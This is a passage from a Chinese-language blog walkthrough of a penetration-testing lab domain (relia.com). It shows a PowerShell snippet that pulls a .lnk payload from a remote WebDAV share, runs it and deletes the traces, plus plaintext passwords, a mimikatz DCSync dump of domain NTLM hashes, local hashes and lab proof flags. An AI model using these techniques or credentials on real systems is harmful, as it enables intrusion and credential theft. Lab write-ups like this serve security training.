       $share = &quot;\\$ip\DavWWWRoot\&quot;
       net use H: $share
       Get-ChildItem &quot;$share\*.lnk&quot; | ForEach-Object {

        copy $_.FullName C:\Windows\Tasks\temp.lnk
        net use H: /delete
        Unblock-File -Path C:\Windows\Tasks\temp.lnk
        powershell -c invoke-item C:\Windows\Tasks\temp.lnk
        Get-ChildItem -Path C:\attachments | Where-Object Extension -in ('.Library-ms') | foreach { $_.Delete()}
        Remove-Item -Force C:\Windows\Tasks\temp.lnk
     }


 }

Clear-RecycleBin -Force

</code></pre>
<h3 id="发现kdbx-文件">发现Kdbx 文件</h3>
<p>解密成功<br>
<img src="https://blog.cxaqhq.cn/post-images/1692877314007.png" alt="" loading="lazy"></p>
<h4 id="keepass2-数据库解密">Keepass2 数据库解密</h4>
<p><img src="https://blog.cxaqhq.cn/post-images/1692877238948.png" alt="" loading="lazy"><br>
<img src="https://blog.cxaqhq.cn/post-images/1692877231888.png" alt="" loading="lazy"></p>
<h3 id="lazagne-密码抓取">Lazagne 密码抓取</h3>
<figure data-type="image" tabindex="22"><img src="https://blog.cxaqhq.cn/post-images/1692877489636.png" alt="" loading="lazy"></figure>
<h3 id="获取-localtxt-prooftxt">获取 local.txt proof.txt</h3>
<figure data-type="image" tabindex="23"><img src="https://blog.cxaqhq.cn/post-images/1694519426609.png" alt="" loading="lazy"></figure>
<h2 id="191">191</h2>
<h3 id="rdp-登陆">RDP 登陆</h3>
<pre><code>xfreerdp /v:192.168.242.191:3389 /u:dmzadmin /p:SlimGodhoodMope
</code></pre>
<p><img src="https://blog.cxaqhq.cn/post-images/1692956233893.png" alt="" loading="lazy"><br>
<img src="https://blog.cxaqhq.cn/post-images/1692956190995.png" alt="" loading="lazy"></p>
<h2 id="域渗透">域渗透</h2>
<h3 id="信息收集-2">信息收集</h3>
<h4 id="域管">域管</h4>
<p>域管</p>
<pre><code>net group &quot;domain admins&quot; /domain
Administrator            dan                      internaladmin
</code></pre>
<p>域控<br>
<img src="https://blog.cxaqhq.cn/post-images/1692879863330.png" alt="" loading="lazy"></p>
<p>域用户列表</p>
<pre><code>net user /domain

Administrator            andrea                   anna                     
brad                     dan                      Guest                    
iis_service              internaladmin            jenny                    
jim                      krbtgt                   larry                    
maildmz                  michelle                 milana                   
mountuser 
</code></pre>
<p>Shell 脚本批量使用smbclient 探测文件共享</p>
<pre><code>for i in {6,7,21,19,15,30,14,20}; do proxychains4 smbclient -L  //172.16.86.${i} -U relia.com/jim%Castello1!; done
</code></pre>
<p>发现 6、21 机器存在可疑共享，进去查看文件，在21上发现Powershell 脚本历史记录，从中找到密码<br>
<img src="https://blog.cxaqhq.cn/post-images/1693478190254.png" alt="" loading="lazy"></p>
<pre><code>**********************
Windows PowerShell transcript start
Start time: 20221019132304
Username: FILES\Administrator
RunAs User: FILES\Administrator
Configuration Name:
Machine: FILES (Microsoft Windows NT 10.0.20348.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 5936
PSVersion: 5.1.20348.859
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.20348.859
BuildVersion: 10.0.20348.859
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Transcript started, output file is C:\Users\Administrator\Documents\PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt
PS C:\Users\Administrator&gt; $spass = ConvertTo-SecureString &quot;vau!XCKjNQBv2$&quot; -AsPlaintext -Force
PS C:\Users\Administrator&gt; $cred = New-Object System.Management.Automation.PSCredential(&quot;RELIA\Administrator&quot;, $spass)
PS C:\Users\Administrator&gt; Enter-PSSession -ComputerName INTRANET -Credential $cred
Enter-PSSession : Connecting to remote server INTRANET failed with the following error message : WinRM cannot complete
the operation. Verify that the specified computer name is valid, that the computer is accessible over the network, and
that a firewall exception for the WinRM service is enabled and allows access from this computer. By default, the WinRM
firewall exception for public profiles limits access to remote computers within the same local subnet. For more
information, see the about_Remote_Troubleshooting Help topic.
</code></pre>
<p>拿下域控<br>
<img src="https://blog.cxaqhq.cn/post-images/1693478178220.png" alt="" loading="lazy"></p>
<p>Dcsync</p>
<pre><code>PS C:\&gt; ./m.exe privilege::debug log &quot;lsadump::dcsync /domain:relia.com /all /csv&quot; exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # lsadump::dcsync /domain:relia.com /all /csv
[DC] 'relia.com' will be the domain
[DC] 'DC02.relia.com' will be the DC server
[DC] Exporting domain 'relia.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  b896b5f9c769cd04d97008292674c1a5        514
1110    larry   47995d3e82d8e698f9b1a9d78c90aa7e        66048
1113    brad    970ba7d4c92f712d0363706d6144c058        66048
1123    dan     4b22394fc907bd7a74d1af6cc9aca348        66048
1103    maildmz ddbe308ff30d828d484098d1c75c6166        66048
1114    anna    f79bec80e693e632f973d32b3489af18        66048
1105    michelle        18d4098c8d9ff721745b388ad4a442bf        4260352
1107    mountuser       6a2f774420368de1567dea28ab0d3988        66048
1108    iis_service     bb4136aaa06fe1688b300e2f9243e85b        66048
1111    jenny   5ef6ddc308ac24d5423c0b983eee159c        66048
1106    andrea  ce3f12443651168b3793f5fbcccff9db        66048
1109    internaladmin   65a883e27cc4714738dfe4dce95001db        66048
1000    DC02$   0be5ec2a3dfc501a679203e07e696be8        532480
500     Administrator   60446f9e333abfda8c548cbe11daedc2        66048
1127    WEBBY$  2e746058eb8dd09d4bc4727a5e951cc2        4096
1122    WK02$   d7f8ba03df0319602fcaa9f4159cc737        4096
1121    WK01$   a910a876d959c52936084752c5575d49        4096
1104    jim     be5cb823ee026304b6ed0cd356e34a3c        66048
1124    milana  2237ff5905ec2fd9ebbdfa3a14d1b2b6        66048
1126    FILES$  955f885b0087a2c5eb44447a4dbd2f12        4096
1119    MAIL$   c5cf3b2b8a7bde67599a1784de8744aa        4096
1125    INTRANET$       8514c03ee48c29a13fcc44d2ee4865a2        4096
1120    LOGIN$  6a6ad6f37911df51165fae90cddb51c9        4096

mimikatz(commandline) # exit
Bye!


</code></pre>
<figure data-type="image" tabindex="24"><img src="https://blog.cxaqhq.cn/post-images/1693479422640.png" alt="" loading="lazy"></figure>
<p>6、7、21、15、189拿下</p>
<p>6</p>
<pre><code>PS C:\&gt; cat C:\users\Administrator\Desktop\proof.txt
1740a52a921adc025502c7a03d70bf22
</code></pre>
<p>7</p>
<pre><code>PS C:\&gt; cat C:\users\michelle\Desktop\local.txt
d6caa6622087693633976bbc496e32f1
PS C:\&gt; cat C:\users\Administrator\Desktop\proof.txt
acdf6d94c4c7b6ebd9a1cb8a4b650b10

本地账号HASH
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b4547a5116dd13e6e206d1286a06b28:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9756266d27a75c923beb3c8c654b31d4:::
</code></pre>
<p>21</p>
<pre><code>PS C:\&gt; cat C:\users\Administrator\Desktop\proof.txt
ed42ff3c31f5f4fcb81ac8a17fd9e361
</code></pre>
<p>15</p>
<pre><code>PS C:\&gt; cat C:\users\andrea\Desktop\local.txt
b76ae7f51a98090f84329cc27874001c
PS C:\&gt; cat C:\users\milana\Desktop\proof.txt
960f03e8c4a32173463e50d9153bb283

本地账号HASH
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:030b83437fa120c80e8d06967d8fad82:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:cf998001c44803b490a46f363a2ca812:::

</code></pre>
<p>30 Mongodb</p>
<pre><code>PS C:\&gt; cat C:\users\Administrator\Desktop\proof.txt
c43ba8370e020531c0d6c2677b434884

本地账号HASH
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e0ace20a027ab482a0e0c42ce61fd2d4:::

</code></pre>
<p>14</p>
<pre><code>PS C:\&gt; PS C:\&gt; cat C:\users\offsec\Desktop\proof.txt
a11b1db8140dac6a7f004bef27445dae
PS C:\&gt; cat C:\users\jim\Desktop\local.txt
ce46a4a60d973bb0cedbb1f679a3f777

文件：
C:\Users\jim\Documents\Database.kdbx
本地账号HASH
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d8aa69abd669a0d0ffe02ae095a4e301:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:a6e162b0429f0ff6cee42809a01fd49d:::
</code></pre>
<p>189</p>
<pre><code>PS C:\&gt; cmd.exe /c &quot;dir /s/b c:\proof.txt&quot;
c:\Documents and Settings\Administrator\Desktop\proof.txt
c:\Users\Administrator\Desktop\proof.txt
PS C:\&gt; type c:\Users\Administrator\Desktop\proof.txt
7abc53251d6238edafc4a47c366a9f84
</code></pre>
<figure data-type="image" tabindex="25"><img src="https://blog.cxaqhq.cn/post-images/1694520054066.png" alt="" loading="lazy"></figure>
<p>还剩2台：19、20</p>
<p>解密15机器上的Keepass数据库，发现敏感信息<br>
<img src="https://blog.cxaqhq.cn/post-images/1693484752786.png" alt="" loading="lazy"></p>
<pre><code>sarah@backup:~$ cat local.txt
63859027bec34e61664daac1a21fa992
</code></pre>
<p>20</p>
<pre><code>$ cat /root/proof.txt
4385803a3643c96fa1da5a9df6930328
$ cat /home/andrew/local.txt
192d05d2dd9012544efcd9688863e030
</code></pre>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E6%9C%BA%E5%99%A8%E8%AF%A6%E6%83%85">机器详情</a>
<ul>
<li><a href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81">账号密码</a></li>
<li><a href="#249-ritecms-getshell">249 RiteCMS GetShell</a>
<ul>
<li><a href="#%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3">开放端口</a></li>
<li><a href="#web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F">Web目录扫描</a></li>
<li><a href="#getshell-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">GetShell-信息收集</a></li>
</ul>
</li>
<li><a href="#%E6%89%BE%E7%9A%84damon-%E5%AF%86%E7%A0%81">找的damon 密码</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90">获取管理员权限</a>
<ul>
<li><a href="#cme-%E8%8E%B7%E5%8F%96shell">CME 获取Shell</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96prooftxt">获取proof.txt</a></li>
</ul>
</li>
<li><a href="#mimikatz">Mimikatz</a>
<ul>
<li><a href="#%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF">获取敏感信息</a>
<ul>
<li><a href="#%E5%8F%91%E7%8E%B0%E9%82%AE%E7%AE%B1%E5%AF%86%E7%A0%81">发现邮箱密码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#248-getshell">248  GetShell</a>
<ul>
<li><a href="#%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4">后台弱口令</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件白名单&amp;文件上传</a>
<ul>
<li><a href="#%E5%AF%BB%E6%89%BEsql-server-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF">寻找Sql Server  配置信息</a></li>
</ul>
</li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
<ul>
<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹Shell</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90">查看当前权限</a></li>
<li><a href="#%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F">提权成功</a></li>
</ul>
</li>
<li><a href="#%E6%8B%BF%E4%B8%8B">拿下</a></li>
<li><a href="#hash">HASH</a></li>
</ul>
</li>
<li><a href="#247">247</a>
<ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
<ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a></li>
<li><a href="#web%E6%89%AB%E6%8F%8F">Web扫描</a></li>
<li><a href="#ftp-%E5%8C%BF%E5%90%8D%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">FTP 匿名文件下载</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a>
<ul>
<li><a href="#%E9%85%8D%E7%BD%AEhosts">配置Hosts</a></li>
<li><a href="#powershell-%E5%8F%8D%E5%BC%B9shell">PowerShell 反弹Shell</a></li>
</ul>
</li>
<li><a href="#%E6%8F%90%E6%9D%83-2">提权</a></li>
<li><a href="#get-shell">Get Shell</a></li>
</ul>
</li>
<li><a href="#246">246</a>
<ul>
<li><a href="#web-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">WEB 任意文件读取</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96ssh-%E7%A7%81%E9%92%A5">读取SSH 私钥</a>
<ul>
<li><a href="#%E7%88%86%E7%A0%B4ssh-%E7%A7%81%E9%92%A5">爆破SSH 私钥</a></li>
</ul>
</li>
<li><a href="#ssh%E7%99%BB%E9%99%86%E6%8F%90%E6%9D%83">SSH登陆&amp;提权</a>
<ul>
<li><a href="#%E5%8F%91%E7%8E%B0%E7%89%B9%E6%AE%8Aweb%E6%9C%8D%E5%8A%A1">发现特殊Web服务</a></li>
<li><a href="#%E5%8F%91%E7%8E%B0%E5%8F%AF%E7%96%91php">发现可疑PHP</a></li>
<li><a href="#php-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">PHP 本地文件包含</a></li>
</ul>
</li>
<li><a href="#getshell">GetShell</a></li>
</ul>
</li>
<li><a href="#245">245</a>
<ul>
<li><a href="#ssh-%E7%A7%81%E9%92%A5%E7%99%BB%E9%99%86">SSH 私钥登陆</a></li>
<li><a href="#sudo-%E6%8F%90%E6%9D%83">Sudo 提权</a></li>
<li><a href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81-2">账号密码</a></li>
</ul>
</li>
<li><a href="#14">14</a>
<ul>
<li><a href="#%E4%BD%BF%E7%94%A8%E4%B8%8A%E9%9D%A2%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC">使用上面获取对账号密码钓鱼</a>
<ul>
<li><a href="#%E5%BC%80%E5%90%AFweb%E6%9C%8D%E5%8A%A1">开启WEB服务</a></li>
<li><a href="#%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">发送钓鱼邮件</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96shell">获取Shell</a></li>
</ul>
</li>
<li><a href="#%E5%8F%91%E7%8E%B0%E5%8F%AF%E7%96%91%E6%96%87%E4%BB%B6">发现可疑文件</a></li>
<li><a href="#%E5%8F%91%E7%8E%B0kdbx-%E6%96%87%E4%BB%B6">发现Kdbx 文件</a>
<ul>
<li><a href="#keepass2-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86">Keepass2 数据库解密</a></li>
</ul>
</li>
<li><a href="#lazagne-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96">Lazagne 密码抓取</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96-localtxt-prooftxt">获取 local.txt proof.txt</a></li>
</ul>
</li>
<li><a href="#191">191</a>
<ul>
<li><a href="#rdp-%E7%99%BB%E9%99%86">RDP 登陆</a></li>
</ul>
</li>
<li><a href="#%E5%9F%9F%E6%B8%97%E9%80%8F">域渗透</a>
<ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2">信息收集</a>
<ul>
<li><a href="#%E5%9F%9F%E7%AE%A1">域管</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://blog.cxaqhq.cn/post/jie-chi-sheng-ji-lou-dong/">
              <h3 class="post-title">
                劫持升级漏洞
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Backdoor
  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
